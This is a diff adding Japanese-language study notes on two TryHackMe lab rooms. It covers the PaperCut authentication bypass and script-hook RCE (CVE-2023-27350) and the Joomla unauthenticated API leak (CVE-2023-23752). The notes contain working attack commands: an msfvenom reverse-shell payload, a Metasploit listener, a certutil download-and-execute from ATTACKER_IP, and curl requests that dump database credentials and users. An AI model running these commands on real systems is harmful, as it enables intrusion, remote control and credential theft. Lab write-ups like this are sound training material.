@@ -149,3 +149,70 @@ response = requests.post(url, json=data)
 ```
 
 返ってきた Cookie をブラウザに設定すると、認証済状態になる。
+
+## CVE-2023-27350 (PaperCut)
+
+https://tryhackme.com/room/papercut
+
+- PaperCut < `20.1.7`, `21.2.11`, `22.0.9`
+- 認証バイパスの脆弱性。
+- 管理コンソールにスクリプト機能があり RCE につながる。
+- サンドボックス設定を無効にすると、スクリプトが Java ランタイムに直接アクセスできる。
+- PrintCut サービスは、NT AUTHORITY\SYSTEM または root ユーザーで実行される。
+
+認証バイパス方法は、下記 URL にアクセスするだけ。
+
+`http://<ip>:9191/app?service=page/SetupCompleted`
+
+その後、`Printers -> Template printer -> Scripting -> Enable print script` を有効化する。
+
+下記のようにコマンドを実行できる。
+
+```js
+function printJobHook(inputs, actions) {
+  // your script here
+}
+java.lang.Runtime.getRuntime().exec("ping.exe ATTACKER_IP");
+```
+
+CLI でコマンド実行できるエクスプロイト
+
+https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py
+
+```sh
+# リバースシェルを作成してHTTPサーバー起動
+msfvenom -p windows/shell/reverse_tcp -f exe LHOST=ATTACKER_IP LPORT=4444 -o shell.exe
+python3 -m http.server 8080
+
+# リバースシェルのリッスン
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"
+
+# ダウンロード＆実行
+python3 CVE-2023-27350.py -u http://10.10.210.29:9191 -c "certutil.exe -urlcache -f http://ATTACKER_IP:8080/shell.exe shell.exe"
+python3 CVE-2023-27350.py -u http://10.10.210.29:9191 -c "cmd.exe /c shell.exe"
+```
+
+## CVE-2023-23752 (Joomify)
+
+https://tryhackme.com/room/joomify
+
+- Joomla! `4.0.0 ~ 4.2.7`
+- Joomla! は、第 5 位のコンテンツ管理システム（CMS）
+- API エンドポイントで GET パラメータの public を true にすることで認証なしでアクセスできるようになる。
+- 情報漏洩の脆弱性で、重大度は Medium。
+
+api 配下のフォルダ構造を脆弱性のあるバージョンをダウンロードして調べることが可能。  
+https://downloads.joomla.org/cms/joomla4/4-1-0
+
+API リスト  
+https://docs.joomla.org/J4.x:Joomla_Core_APIs
+
+エクスプロイト
+
+```sh
+# アプリケーション設定（DB接続情報など）
+curl -v http://10.10.120.177/api/index.php/v1/config/application?public=true
+
+# ユーザー
+curl -v http://10.10.120.177/api/index.php/v1/users?public=true
+```
